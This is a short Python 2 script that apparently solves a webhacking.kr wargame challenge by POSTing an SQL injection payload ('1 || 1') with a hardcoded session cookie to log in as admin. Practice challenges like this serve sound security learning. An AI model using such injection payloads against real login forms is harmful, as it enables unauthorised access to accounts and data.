#-*- coding: utf-8 -*-
import urllib
import urllib2
import CookieManager


challengeUrl = "http://webhacking.kr/challenge/web/web-03/index.php"
sessionId = "d106ebfb4bba898681f92c7f5316fa6b"

print "[*] SQL Injection"

CookieManager.addCookie("PHPSESSID", sessionId)

parameters = urllib.urlencode({
    "id": "admin", 
    "answer": "1 || 1"
})

httpRequest = urllib2.Request(challengeUrl, data=parameters)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: 'POST'

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
